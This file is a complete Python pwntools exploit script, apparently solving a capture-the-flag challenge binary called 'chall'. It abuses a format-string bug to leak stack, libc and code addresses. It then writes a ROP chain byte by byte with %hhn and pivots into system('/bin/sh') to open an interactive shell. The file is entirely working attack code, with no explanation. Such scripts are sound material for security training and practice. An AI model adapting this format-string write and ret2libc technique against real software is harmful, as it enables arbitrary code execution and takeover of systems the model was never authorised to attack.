from pwn import *

libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
context.clear(arch = 'amd64')

script = '''
b *main + 131
'''

# BRUTEFORCES
#for i in range(1):
while(True):
    try:
        p = process("./chall")
        #p = gdb.debug("./chall", gdbscript = script)
            
        ptr_ptr_offset = 21
        stk_ptr_offset = 51
        ret_addr_partial = 0xa1b8
        main_partial = 0x36
            
        payload = b"%c" * (ptr_ptr_offset - 2) + f"%{ret_addr_partial - ptr_ptr_offset + 2}c%hn".encode()
        padding = (main_partial - (ret_addr_partial & 0xff) + 0x100) & 0xff
        payload += f"%{padding}c%{stk_ptr_offset}$hhn____".encode()
        p.send(payload)
        p.recvuntil(b"____")
        
        payload = f"%{main_partial}c%{stk_ptr_offset}$hhn%{ptr_ptr_offset}$p%17$p%19$p\x00".encode()
        p.send(payload)
        p.recv(main_partial)
        rbp = int(p.recv(14), 16) - 0x118
        libc_base = int(p.recv(14), 16) - 0x29d90
        code_base = int(p.recv(14), 16) - 0x11c9
        
        break
    except:
        try:
            p.close()
        except:
            pass

print(hex(rbp), hex(libc_base), hex(code_base))
#gdb.attach(p, gdbscript = script)

# PERFORM ROP
pop_rdi = libc_base + 0x000000000002a3e5
ret = pop_rdi + 1
system = libc_base + 0x50d70
binsh = libc_base + 0x1d8678

target = [(rbp + 0x8, pop_rdi), (rbp + 0x10, binsh), (rbp + 0x18, ret), (rbp + 0x20, system), (rbp + 0x118, rbp + 0x118)]
for (addr, val) in target:
    for i in range(6):
        if((val & 0xff) > main_partial):
            payload = f"%{main_partial}c%11$hhn%{(val & 0xff) - main_partial}c%10$hhn".encode()
        elif((val & 0xff) == main_partial):
            payload = f"%{main_partial}c%11$hhn%10$hhn".encode()
        else:
            payload = f"%{val & 0xff}c%10$hhn%{main_partial - (val & 0xff)}c%11$hhn".encode()
        
        payload = payload.ljust(0x20, b"\x00")
        payload += p64(addr + i) + p64(rbp - 0x58) + b"\x00"
        p.send(payload)
        p.recv(max(val & 0xff, main_partial))
        
        val = val >> 8

# TRIGGER ROP
leave_ret_partial = 0x7b
payload = f"%{leave_ret_partial}c%{stk_ptr_offset}$hhn\x00".encode()
p.send(payload)

p.interactive()
